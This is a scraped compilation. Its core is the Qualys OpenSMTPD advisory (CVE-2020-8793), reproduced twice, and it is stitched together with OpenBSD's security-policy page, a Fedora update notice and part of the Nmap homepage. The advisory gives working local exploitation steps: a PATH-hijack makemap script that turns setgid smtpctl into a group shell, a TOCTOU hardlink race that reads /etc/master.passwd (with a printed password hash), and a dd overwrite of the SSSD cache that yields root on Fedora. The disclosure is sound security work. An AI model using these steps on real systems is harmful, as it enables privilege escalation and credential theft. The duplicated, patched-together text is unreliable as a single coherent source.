==============================================================================
Summary
==============================================================================

We discovered a minor vulnerability in OpenSMTPD, OpenBSD's mail server:
an unprivileged local attacker can read the first line of an arbitrary
file (for example, root's password hash in /etc/master.passwd) or the
entire contents of another user's file (if this file and
/var/spool/smtpd/ are on the same filesystem).

We developed a proof of concept and successfully tested it against
OpenBSD 6.6 (the current release). This vulnerability is generally not
exploitable on Linux, because /proc/sys/fs/protected_hardlinks is 1 by
default on most distributions. Surprisingly, however, it is exploitable
on Fedora (31) and yields full root privileges.

==============================================================================
Analysis
==============================================================================

In October 2015 we published the results of an exhaustive OpenSMTPD
audit (<https://www.qualys.com/2015/10/02/opensmtpd-audit-report.txt>);
one of our key findings was:

------------------------------------------------------------------------------
Multiple hardlink attacks in the offline directory
...

In the world-writable "/var/spool/smtpd/offline" directory, local users
can create hardlinks to files they do not own, and wait until the server
reboots (or, crash OpenSMTPD with a denial-of-service and wait until the
administrator restarts it) to carry out assorted attacks.
...

2/ The following code in offline_enqueue() allows an attacker to
execvp() "/usr/sbin/smtpctl" as "sendmail", with a command-line argument
that is the hardlinked file's first line (CVE-2015-ABCD):
...

For example, an attacker can hardlink /etc/master.passwd to the offline
directory, and retrieve its first line (root's encrypted password) by
running ps (or a small program that simply calls sysctl() with
KERN_FILE_BYUID and KERN_PROC_ARGV) in a loop:
...

4/ If an attacker is able to reach another user's file (i.e., +x on all
directories that lead to the file) but not read it, he can hardlink the
file to the offline directory, and wait for savedeadletter() to create a
world-readable copy of the file in this other user's home directory:
------------------------------------------------------------------------------

OpenBSD's patch for this vulnerability was threefold:

a/ They removed the world-writable and sticky bits from
/var/spool/smtpd/offline, changed its group to "_smtpq", and made
/usr/sbin/smtpctl set-group-ID _smtpq:

------------------------------------------------------------------------------
drwxrwx---  2 root  _smtpq     512 Oct 12 10:34 /var/spool/smtpd/offline
-r-xr-sr-x  1 root  _smtpq  217736 Oct 12 10:34 /usr/sbin/smtpctl
------------------------------------------------------------------------------

b/ They added an _smtpq group check to offline_scan():

------------------------------------------------------------------------------
1543                 /* offline file group must match parent directory group */
1544                 if (e->fts_statp->st_gid != e->fts_parent->fts_statp->st_gid)
1545                         continue;
....
1553                 if (offline_add(e->fts_name)) {
1554                         log_warnx("warn: smtpd: "
1555                             "could not add offline message %s", e->fts_name);
1556                         continue;
1557                 }
------------------------------------------------------------------------------

This check (at line 1544) effectively prevents offline_scan() from
adding the filename of a hardlink to the offline queue (at line 1553),
because no interesting file on the filesystem belongs to the group
_smtpq.

c/ They added a hardlink check to offline_enqueue() (at line 1631),
which is called by offline_add():

------------------------------------------------------------------------------
1615                 if ((fd = open(path, O_RDONLY|O_NOFOLLOW|O_NONBLOCK)) == -1) {
1616                         log_warn("warn: smtpd: open: %s", path);
1617                         _exit(1);
1618                 }
1619
1620                 if (fstat(fd, &sb) == -1) {
1621                         log_warn("warn: smtpd: fstat: %s", path);
1622                         _exit(1);
1623                 }
....
1631                 if (sb.st_nlink != 1) {
1632                         log_warnx("warn: smtpd: file %s is hard-link", path);
1633                         _exit(1);
1634                 }
------------------------------------------------------------------------------

Unfortunately, a/ is vulnerable to a Local Privilege Escalation (into
the group _smtpq), and b/ and c/ are vulnerable to TOCTOU (time-of-check
to time-of-use) race conditions. As a result, a local attacker can still
carry out the hardlink attacks 2/ (master.passwd) and 4/ (dead.letter)
described in our 2015 audit report.

==============================================================================
Exploitation
==============================================================================

a/ If we execute /usr/sbin/smtpctl as "sendmail" or "send-mail", and
specify a "-bi" command-line argument, then smtpctl calls execlp()
without dropping its privileges:

------------------------------------------------------------------------------
147         /* sendmail-compat makemap ... re-execute using proper interface */
148         if (argc == 2) {
...
164                 execlp("makemap", "makemap", "-d", argv[0], "-o", dbname, "-",
165                     (char *)NULL);
166                 err(1, "execlp");
167         }
------------------------------------------------------------------------------

We can exploit this execlp() call by specifying our own PATH environment
variable, and obtain the privileges of the group _smtpq:

------------------------------------------------------------------------------
$ id
uid=1001(john) gid=1001(john) groups=1001(john)

$ ln -s /usr/sbin/smtpctl "send-mail"

$ cat > makemap << "EOF"
#!/bin/ksh
echo "$@"
exec /usr/bin/env -i /bin/ksh
EOF

$ chmod 0755 makemap

$ env -i PATH=. ./send-mail -- -bi dbname
-d -bi -o dbname.db -

$ id
uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)
------------------------------------------------------------------------------

b/ The _smtpq group check is made only once in offline_scan(), but not
again in offline_enqueue() (which actually open()s the offline files).
Moreover, at most five offline files are processed concurrently; the
remaining files are simply added to the offline queue for later
processing. We can reliably win this first race condition:

- we create several large but sparse files (1GB each) in the offline
  directory (these files naturally pass the _smtpq group check);

- we SIGSTOP five of the offline_enqueue() processes that open() and
  slowly read() our large files;

- we wait until offline_scan() adds all of our remaining files to the
  offline queue;

- we replace these files with hardlinks to an interesting target file
  (for example, /etc/master.passwd);

- we SIGKILL the five stopped offline_enqueue() processes.

Finally, our hardlinks are processed by offline_enqueue(), and the
_smtpq group check is defeated.

c/ To defeat the hardlink check in offline_enqueue(), we create our
hardlink before the open() call at line 1615 (this increases st_nlink to
2), and delete it before the fstat() call at line 1620 (this decreases
st_nlink back to 1). In practice, we win this tight race condition after
just a few tries: our proof of concept fork()s a dedicated process that
simply calls link() and unlink() in a loop.

Moreover, if our target file is /etc/master.passwd, we can defeat the
hardlink check without a race: we hardlink /etc/master.passwd into the
offline directory (this increases st_nlink to 2), we run /usr/bin/passwd
or /usr/bin/chpass to generate a new /etc/master.passwd (this decreases
st_nlink back to 1), and finally we SIGKILL the five stopped
offline_enqueue() processes.

------------------------------------------------------------------------------

For example, to read the first line of /etc/master.passwd (root's
password hash) with our proof of concept:

- First, on the attacker's terminal:

$ id
uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)

$ ./proof-of-concept 20
...
ready

- Next, on the administrator's terminal:

# rcctl restart smtpd
smtpd(ok)
smtpd(ok)

- Last, on the attacker's terminal:

...
root:$2b$10$xufPzZW36O2h2QmasLsjve8RyRQm0gu3mVX6IHE2nAYYD0Iw0gAnO:0:0:daemon:0:0:Charlie &:/root:/bin/ksh

------------------------------------------------------------------------------

To read the entire contents of another user's file (for example,
/home/admin/deep.secret) with our proof of concept:

- First, on the attacker's terminal:

$ id
uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)

$ ls -l /home/admin/deep.secret
----------  1 admin  admin  125 Feb 15 00:52 /home/admin/deep.secret

$ cat /home/admin/deep.secret
cat: /home/admin/deep.secret: Permission denied

$ ./proof-of-concept 100 /home/admin/deep.secret
...
ready

- Next, on the administrator's terminal:

# rcctl restart smtpd
smtpd(ok)
smtpd(ok)

- Last, on the attacker's terminal:

...
This is the contents of the deep.secret file.  Only root may see this file.
-rw-r--r--  1 admin  admin  132 Feb 15 01:21 /home/admin/dead.letter

$ cat /home/admin/dead.letter
From: admin <admin@...d66.my.domain>
Date: Sat, 15 Feb 2020 01:21:03 -0700 (MST)

secret 2
secret 3
end of secret file deep.secret

==============================================================================
POKE 47196, 201
==============================================================================

On Linux, this vulnerability is generally not exploitable because
/proc/sys/fs/protected_hardlinks prevents attackers from creating
hardlinks to files they do not own. On Fedora 31, however, smtpctl is
set-group-ID root, not set-group-ID smtpq:

------------------------------------------------------------------------------
-r-xr-sr-x. 1 root root 303368 Jul 26  2019 /usr/sbin/smtpctl
------------------------------------------------------------------------------

Surprisingly, we were able to exploit this mistake and obtain full root
privileges:

- First, we exploited the Local Privilege Escalation in smtpctl to
  obtain the privileges of the group root:

------------------------------------------------------------------------------
$ id
uid=1001(john) gid=1001(john) groups=1001(john) context=...

$ ln -s /usr/sbin/smtpctl "send-mail"

$ cat > makemap << "EOF"
#!/bin/bash -p
echo "$@"
exec /usr/bin/env -i /bin/bash -p
EOF

$ chmod 0755 makemap

$ env -i PATH=. ./send-mail -- -bi dbname
-d -bi -o dbname.db -

$ id
uid=1001(john) gid=1001(john) egid=0(root) groups=0(root),1001(john) context=...
------------------------------------------------------------------------------

- Next, we searched for files that belong to the group root, are
  group-writable, but not world-writable:

------------------------------------------------------------------------------
$ find / -group root -perm -020 '!' -perm -02 -ls
  ...
  4811008      0 drwxrwxr-x   2  root     root           51 Feb 15 17:49 /var/lib/sss/mc
  4811064   8212 -rw-rw-r--   1  root     root      8406312 Feb 15 18:58 /var/lib/sss/mc/passwd
  4810978   6260 -rw-rw-r--   1  root     root      6406312 Feb 15 18:58 /var/lib/sss/mc/group
  ...
------------------------------------------------------------------------------

- Intrigued ("sss" stands for "System Security Services"), we dumped the
  contents of /var/lib/sss/mc/passwd:

------------------------------------------------------------------------------
$ hexdump -C /var/lib/sss/mc/passwd
...
00000060  10 00 00 00 e9 03 00 00  e9 03 00 00 1d 00 00 00  |................|
00000070  6a 6f 68 6e 00 78 00 00  2f 68 6f 6d 65 2f 6a 6f  |john.x../home/jo|
00000080  68 6e 00 2f 62 69 6e 2f  62 61 73 68 00 ff ff ff  |hn./bin/bash....|
...
------------------------------------------------------------------------------

- Feeling adventurous, we overwrote "e9 03 00 00" (1001, our user-ID)
  with zeros (root's user-ID):

------------------------------------------------------------------------------
$ dd if=/dev/zero of=/var/lib/sss/mc/passwd bs=1 seek=$((0x64)) count=4 conv=notrunc
4+0 records in
4+0 records out
------------------------------------------------------------------------------

- Last, we executed su to re-authenticate as ourselves (as user john),
  but obtained a root shell instead:

------------------------------------------------------------------------------
$ su -l john
Password:

# id
uid=0(root) gid=1001(john) groups=1001(john) context=...
------------------------------------------------------------------------------

Last-minute note: on February 9, 2020, opensmtpd-6.6.2p1-1.fc31 was
released and correctly made smtpctl set-group-ID smtpq, instead of
set-group-ID root.

* ### Goals

  OpenBSD believes in strong security. Our aspiration is to be NUMBER
  ONE in the industry for security (if we are not already there). Our
  open software development model permits us to take a more
  uncompromising view towards increased security than most vendors are
  able to. We can make changes the vendors would
  not make. Also, since OpenBSD is exported with [cryptography](crypto.html), we are able to take cryptographic approaches towards
  fixing security problems.* ### Full Disclosure

    Like many readers of the
    [BUGTRAQ mailing list](https://marc.info/?l=bugtraq),
    we believe in full disclosure of security problems. In the
    operating system arena, we were probably the first to embrace
    the concept. Many vendors, even of free software, still try
    to hide issues from their users.

    Security information moves very fast in cracker circles. On the other
    hand, our experience is that coding and releasing of proper security
    fixes typically requires about an hour of work — very fast fix
    turnaround is possible. Thus we think that full disclosure helps the
    people who really care about security.

    * ### Audit Process

      Our security auditing team typically has between six and twelve
      members who continue to search for and fix new security holes. We
      have been auditing since the summer of 1996. The process we follow to
      increase security is simply a comprehensive file-by-file analysis of
      every critical software component. We are not so much looking for
      security holes, as we are looking for basic software bugs, and if
      years later someone discovers the problem used to be a security
      issue, and we fixed it because it was just a bug, well, all the
      better. Flaws have been found in just about every area of the system.
      Entire new classes of security problems have been found during our
      audit, and often source code which had been audited earlier needs
      re-auditing with these new flaws in mind. Code often gets audited
      multiple times, and by multiple people with different auditing
      skills.

      Some members of our security auditing team worked for Secure Networks,
      the company that made the industry's premier network security scanning
      software package Ballista (Secure Networks got purchased by Network
      Associates, Ballista got renamed to Cybercop Scanner, and well...)
      That company did a lot of security research, and thus fit in well
      with the OpenBSD stance. OpenBSD passed Ballista's tests with flying
      colours since day 1.

      Another facet of our security auditing process is its proactiveness.
      In most cases we have found that the determination of exploitability
      is not an issue. During our ongoing auditing process we find many
      bugs, and endeavor to fix them even though exploitability is not
      proven. We fix the bug, and we move on to find other bugs to fix. We
      have fixed many simple and obvious careless programming errors in code
      and only months later discovered that the problems were in fact
      exploitable. (Or, more likely someone on
      [BUGTRAQ](https://marc.info/?l=bugtraq)
      would report that other operating systems were vulnerable to a newly
      discovered problem, and then it would be discovered that OpenBSD had
      been fixed in a previous release). In other cases we have been saved
      from full exploitability of complex step-by-step attacks because we
      had fixed one of the intermediate steps. An example of where we
      managed such a success is the lpd advisory that Secure Networks put out.* ### New Technologies

        As we audit source code, we often invent new ways of solving problems.
        Sometimes these ideas have been used before in some random application
        written somewhere, but perhaps not taken to the degree that we do.

          Our proactive auditing process has really paid off. Statements like
          This problem was fixed in OpenBSD about 6 months ago have become
          commonplace in security forums like
          [BUGTRAQ](https://marc.info/?l=bugtraq).

          The most intense part of our security auditing happened immediately
          before the OpenBSD 2.0 release and during the 2.0→2.1 transition,
          over the last third of 1996 and first half of 1997. Thousands (yes,
          thousands) of security issues were fixed rapidly over this year-long
          period; bugs like the standard buffer overflows, protocol
          implementation weaknesses, information gathering, and filesystem
          races. Hence most of the security problems that we encountered were
          fixed before our 2.1 release, and then a far smaller number needed
          fixing for our 2.2 release. We do not find as many problems anymore,
          it is simply a case of diminishing returns. Recently the security
          problems we find and fix tend to be significantly more obscure or
          complicated. Still we will persist for a number of reasons:
          + Occasionally we find a simple problem we missed earlier. Doh!+ Security is like an arms race; the best attackers will continue
              to search for more complicated exploits, so we will too.+ Finding and fixing subtle flaws in complicated software is
                a lot of fun.

          The auditing process is not over yet, and as you can see we continue
          to find and fix new security flaws.* ### Secure by Default

            To ensure that novice users of OpenBSD do not need to become security
            experts overnight (a viewpoint which other vendors seem to have), we
            ship the operating system in a Secure by Default mode. All non-essential
            services are disabled. As the user/administrator becomes more familiar
            with the system, he will discover that he has to enable daemons and other
            parts of the system. During the process of learning how to enable a new
            service, the novice is more likely to learn of security considerations.

            This is in stark contrast to the increasing number of systems that
            ship with NFS, mountd, web servers, and various other services enabled
            by default, creating instantaneous security problems for their users
            within minutes after their first install.* ### Cryptography

              And of course, since the OpenBSD project is based in Canada, it is possible
              for us to integrate cryptography. For more information, read the page
              outlining [what we have done with cryptography](crypto.html).* ### Advisories

                Please refer to the links at the top of this page.* ### Watching our Changes

                  Since we take a proactive stance with security, we are continually
                  finding and fixing new security problems. Not all of these problems
                  get widely reported because (as stated earlier) many of them are not
                  confirmed to be exploitable; many simple bugs we fix do turn out to
                  have security consequences we could not predict. We do not have the
                  time resources to make these changes available in the above format.

                  Thus there are usually minor security fixes in the current source code
                  beyond the previous major OpenBSD release. We make a limited
                  guarantee that these problems are of minimal impact and unproven
                  exploitability. If we discover that a problem definitely matters for
                  security, patches will show up here **VERY** quickly.

                  People who are really concerned with security can do a number of
                  things:
                  + If you understand security issues, watch our
                    [source-changes mailing list](mail.html) and keep an
                    eye out for things which appear security related. Since
                    exploitability is not proven for many of the fixes we make,
                    do not expect the relevant commit message to say SECURITY FIX!.
                    If a problem is proven and serious, a patch will be available
                    here very shortly after.+ Track our current source code tree, and teach yourself how to do a
                      complete system build from time to time (read /usr/src/Makefile
                      carefully). Users can make the assumption that the current
                      source tree always has stronger security than the previous release.
                      However, building your own system from source code is not trivial;
                      it is over 850MB of source code, and problems do occur as we
                      transition between major releases.+ Install a binary snapshot for your
                        architecture, which are made available fairly often. For
                        instance, an amd64 snapshot is typically made available daily.* ### Reporting problems

                    If you find a new security problem, you can mail it to
                    security@openbsd.org.

                    If you wish to PGP encode it (but please only do so if privacy is very
                    urgent, since it is inconvenient) use this [pgp key](advisories/pgpkey.txt).* ### Further Reading

                      Numerous
                      [papers](events.html) have been written by OpenBSD team members,
                      many dedicated to security.

Fedora Update Notification
FEDORA-2020-b92d7083ca
2020-03-16 20:26:14.974158
--------------------------------------------------------------------------------

Name : opensmtpd
Product : Fedora 32
Version : 6.6.4p1
Release : 2.fc32
URL : <http://www.opensmtpd.org/>
Summary : Free implementation of the server-side SMTP protocol as defined by RFC 5321
Description :
OpenSMTPD is a FREE implementation of the server-side SMTP protocol as defined
by RFC 5321, with some additional standard extensions. It allows ordinary
machines to exchange e-mails with other systems speaking the SMTP protocol.
Started out of dissatisfaction with other implementations, OpenSMTPD nowadays
is a fairly complete SMTP implementation. OpenSMTPD is primarily developed
by Gilles Chehade, Eric Faurot and Charles Longeau; with contributions from
various OpenBSD hackers. OpenSMTPD is part of the OpenBSD Project.
The software is freely usable and re-usable by everyone under an ISC license.

This package uses standard "alternatives" mechanism, you may call
"/usr/sbin/alternatives --set mta /usr/sbin/sendmail.opensmtpd"
if you want to switch to OpenSMTPD MTA immediately after install, and
"/usr/sbin/alternatives --set mta /usr/sbin/sendmail.sendmail" to revert
back to Sendmail as a default mail daemon.

--------------------------------------------------------------------------------
Update Information:

Release 6.6.4p1 (2020-02-24) --- - An out of bounds read in smtpd allows an
attacker to inject arbitrary commands into the envelope file which are then
executed as root. Separately, missing privilege revocation in smtpctl allows
arbitrary commands to be run with the \_smtpq group. Release 6.6.3p1
(2020-02-10) --- - Following the 6.6.2p1 release, various improvements were
done in OpenBSD -current to mitigate the risk of similar bugs.

Local information disclosure in OpenSMTPD (CVE-2020-8793)

Acknowledgments

==============================================================================
Summary
==============================================================================

We discovered a minor vulnerability in OpenSMTPD, OpenBSD's mail server:
an unprivileged local attacker can read the first line of an arbitrary
file (for example, root's password hash in /etc/master.passwd) or the
entire contents of another user's file (if this file and
/var/spool/smtpd/ are on the same filesystem).

We developed a proof of concept and successfully tested it against
OpenBSD 6.6 (the current release). This vulnerability is generally not
exploitable on Linux, because /proc/sys/fs/protected_hardlinks is 1 by
default on most distributions. Surprisingly, however, it is exploitable
on Fedora (31) and yields full root privileges.

==============================================================================
Analysis
==============================================================================

In October 2015 we published the results of an exhaustive OpenSMTPD
audit (<https://www.qualys.com/2015/10/02/opensmtpd-audit-report.txt>);
one of our key findings was:

------------------------------------------------------------------------------
Multiple hardlink attacks in the offline directory
...

In the world-writable "/var/spool/smtpd/offline" directory, local users
can create hardlinks to files they do not own, and wait until the server
reboots (or, crash OpenSMTPD with a denial-of-service and wait until the
administrator restarts it) to carry out assorted attacks.
...

2/ The following code in offline_enqueue() allows an attacker to
execvp() "/usr/sbin/smtpctl" as "sendmail", with a command-line argument
that is the hardlinked file's first line (CVE-2015-ABCD):
...

For example, an attacker can hardlink /etc/master.passwd to the offline
directory, and retrieve its first line (root's encrypted password) by
running ps (or a small program that simply calls sysctl() with
KERN_FILE_BYUID and KERN_PROC_ARGV) in a loop:
...

4/ If an attacker is able to reach another user's file (i.e., +x on all
directories that lead to the file) but not read it, he can hardlink the
file to the offline directory, and wait for savedeadletter() to create a
world-readable copy of the file in this other user's home directory:
------------------------------------------------------------------------------

OpenBSD's patch for this vulnerability was threefold:

a/ They removed the world-writable and sticky bits from
/var/spool/smtpd/offline, changed its group to "_smtpq", and made
/usr/sbin/smtpctl set-group-ID _smtpq:

------------------------------------------------------------------------------
drwxrwx---  2 root  _smtpq     512 Oct 12 10:34 /var/spool/smtpd/offline
-r-xr-sr-x  1 root  _smtpq  217736 Oct 12 10:34 /usr/sbin/smtpctl
------------------------------------------------------------------------------

b/ They added an _smtpq group check to offline_scan():

------------------------------------------------------------------------------
1543                 /* offline file group must match parent directory group */
1544                 if (e->fts_statp->st_gid != e->fts_parent->fts_statp->st_gid)
1545                         continue;
....
1553                 if (offline_add(e->fts_name)) {
1554                         log_warnx("warn: smtpd: "
1555                             "could not add offline message %s", e->fts_name);
1556                         continue;
1557                 }
------------------------------------------------------------------------------

This check (at line 1544) effectively prevents offline_scan() from
adding the filename of a hardlink to the offline queue (at line 1553),
because no interesting file on the filesystem belongs to the group
_smtpq.

c/ They added a hardlink check to offline_enqueue() (at line 1631),
which is called by offline_add():

------------------------------------------------------------------------------
1615                 if ((fd = open(path, O_RDONLY|O_NOFOLLOW|O_NONBLOCK)) == -1) {
1616                         log_warn("warn: smtpd: open: %s", path);
1617                         _exit(1);
1618                 }
1619
1620                 if (fstat(fd, &sb) == -1) {
1621                         log_warn("warn: smtpd: fstat: %s", path);
1622                         _exit(1);
1623                 }
....
1631                 if (sb.st_nlink != 1) {
1632                         log_warnx("warn: smtpd: file %s is hard-link", path);
1633                         _exit(1);
1634                 }
------------------------------------------------------------------------------

Unfortunately, a/ is vulnerable to a Local Privilege Escalation (into
the group _smtpq), and b/ and c/ are vulnerable to TOCTOU (time-of-check
to time-of-use) race conditions. As a result, a local attacker can still
carry out the hardlink attacks 2/ (master.passwd) and 4/ (dead.letter)
described in our 2015 audit report.

==============================================================================
Exploitation
==============================================================================

a/ If we execute /usr/sbin/smtpctl as "sendmail" or "send-mail", and
specify a "-bi" command-line argument, then smtpctl calls execlp()
without dropping its privileges:

------------------------------------------------------------------------------
147         /* sendmail-compat makemap ... re-execute using proper interface */
148         if (argc == 2) {
...
164                 execlp("makemap", "makemap", "-d", argv[0], "-o", dbname, "-",
165                     (char *)NULL);
166                 err(1, "execlp");
167         }
------------------------------------------------------------------------------

We can exploit this execlp() call by specifying our own PATH environment
variable, and obtain the privileges of the group _smtpq:

------------------------------------------------------------------------------
$ id
uid=1001(john) gid=1001(john) groups=1001(john)

$ ln -s /usr/sbin/smtpctl "send-mail"

$ cat > makemap << "EOF"
#!/bin/ksh
echo "$@"
exec /usr/bin/env -i /bin/ksh
EOF

$ chmod 0755 makemap

$ env -i PATH=. ./send-mail -- -bi dbname
-d -bi -o dbname.db -

$ id
uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)
------------------------------------------------------------------------------

b/ The _smtpq group check is made only once in offline_scan(), but not
again in offline_enqueue() (which actually open()s the offline files).
Moreover, at most five offline files are processed concurrently; the
remaining files are simply added to the offline queue for later
processing. We can reliably win this first race condition:

- we create several large but sparse files (1GB each) in the offline
  directory (these files naturally pass the _smtpq group check);

- we SIGSTOP five of the offline_enqueue() processes that open() and
  slowly read() our large files;

- we wait until offline_scan() adds all of our remaining files to the
  offline queue;

- we replace these files with hardlinks to an interesting target file
  (for example, /etc/master.passwd);

- we SIGKILL the five stopped offline_enqueue() processes.

Finally, our hardlinks are processed by offline_enqueue(), and the
_smtpq group check is defeated.

c/ To defeat the hardlink check in offline_enqueue(), we create our
hardlink before the open() call at line 1615 (this increases st_nlink to
2), and delete it before the fstat() call at line 1620 (this decreases
st_nlink back to 1). In practice, we win this tight race condition after
just a few tries: our proof of concept fork()s a dedicated process that
simply calls link() and unlink() in a loop.

Moreover, if our target file is /etc/master.passwd, we can defeat the
hardlink check without a race: we hardlink /etc/master.passwd into the
offline directory (this increases st_nlink to 2), we run /usr/bin/passwd
or /usr/bin/chpass to generate a new /etc/master.passwd (this decreases
st_nlink back to 1), and finally we SIGKILL the five stopped
offline_enqueue() processes.

------------------------------------------------------------------------------

For example, to read the first line of /etc/master.passwd (root's
password hash) with our proof of concept:

- First, on the attacker's terminal:

$ id
uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)

$ ./proof-of-concept 20
...
ready

- Next, on the administrator's terminal:

# rcctl restart smtpd
smtpd(ok)
smtpd(ok)

- Last, on the attacker's terminal:

...
root:$2b$10$xufPzZW36O2h2QmasLsjve8RyRQm0gu3mVX6IHE2nAYYD0Iw0gAnO:0:0:daemon:0:0:Charlie &:/root:/bin/ksh

------------------------------------------------------------------------------

To read the entire contents of another user's file (for example,
/home/admin/deep.secret) with our proof of concept:

- First, on the attacker's terminal:

$ id
uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)

$ ls -l /home/admin/deep.secret
----------  1 admin  admin  125 Feb 15 00:52 /home/admin/deep.secret

$ cat /home/admin/deep.secret
cat: /home/admin/deep.secret: Permission denied

$ ./proof-of-concept 100 /home/admin/deep.secret
...
ready

- Next, on the administrator's terminal:

# rcctl restart smtpd
smtpd(ok)
smtpd(ok)

- Last, on the attacker's terminal:

...
This is the contents of the deep.secret file.  Only root may see this file.
-rw-r--r--  1 admin  admin  132 Feb 15 01:21 /home/admin/dead.letter

$ cat /home/admin/dead.letter
From: admin <admin () obsd66 my.domain>
Date: Sat, 15 Feb 2020 01:21:03 -0700 (MST)

secret 2
secret 3
end of secret file deep.secret

==============================================================================
POKE 47196, 201
==============================================================================

On Linux, this vulnerability is generally not exploitable because
/proc/sys/fs/protected_hardlinks prevents attackers from creating
hardlinks to files they do not own. On Fedora 31, however, smtpctl is
set-group-ID root, not set-group-ID smtpq:

------------------------------------------------------------------------------
-r-xr-sr-x. 1 root root 303368 Jul 26  2019 /usr/sbin/smtpctl
------------------------------------------------------------------------------

Surprisingly, we were able to exploit this mistake and obtain full root
privileges:

- First, we exploited the Local Privilege Escalation in smtpctl to
  obtain the privileges of the group root:

------------------------------------------------------------------------------
$ id
uid=1001(john) gid=1001(john) groups=1001(john) context=...

$ ln -s /usr/sbin/smtpctl "send-mail"

$ cat > makemap << "EOF"
#!/bin/bash -p
echo "$@"
exec /usr/bin/env -i /bin/bash -p
EOF

$ chmod 0755 makemap

$ env -i PATH=. ./send-mail -- -bi dbname
-d -bi -o dbname.db -

$ id
uid=1001(john) gid=1001(john) egid=0(root) groups=0(root),1001(john) context=...
------------------------------------------------------------------------------

- Next, we searched for files that belong to the group root, are
  group-writable, but not world-writable:

------------------------------------------------------------------------------
$ find / -group root -perm -020 '!' -perm -02 -ls
  ...
  4811008      0 drwxrwxr-x   2  root     root           51 Feb 15 17:49 /var/lib/sss/mc
  4811064   8212 -rw-rw-r--   1  root     root      8406312 Feb 15 18:58 /var/lib/sss/mc/passwd
  4810978   6260 -rw-rw-r--   1  root     root      6406312 Feb 15 18:58 /var/lib/sss/mc/group
  ...
------------------------------------------------------------------------------

- Intrigued ("sss" stands for "System Security Services"), we dumped the
  contents of /var/lib/sss/mc/passwd:

------------------------------------------------------------------------------
$ hexdump -C /var/lib/sss/mc/passwd
...
00000060  10 00 00 00 e9 03 00 00  e9 03 00 00 1d 00 00 00  |................|
00000070  6a 6f 68 6e 00 78 00 00  2f 68 6f 6d 65 2f 6a 6f  |john.x../home/jo|
00000080  68 6e 00 2f 62 69 6e 2f  62 61 73 68 00 ff ff ff  |hn./bin/bash....|
...
------------------------------------------------------------------------------

- Feeling adventurous, we overwrote "e9 03 00 00" (1001, our user-ID)
  with zeros (root's user-ID):

------------------------------------------------------------------------------
$ dd if=/dev/zero of=/var/lib/sss/mc/passwd bs=1 seek=$((0x64)) count=4 conv=notrunc
4+0 records in
4+0 records out
------------------------------------------------------------------------------

- Last, we executed su to re-authenticate as ourselves (as user john),
  but obtained a root shell instead:

------------------------------------------------------------------------------
$ su -l john
Password:

# id
uid=0(root) gid=1001(john) groups=1001(john) context=...
------------------------------------------------------------------------------

Last-minute note: on February 9, 2020, opensmtpd-6.6.2p1-1.fc31 was
released and correctly made smtpctl set-group-ID smtpq, instead of
set-group-ID root.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
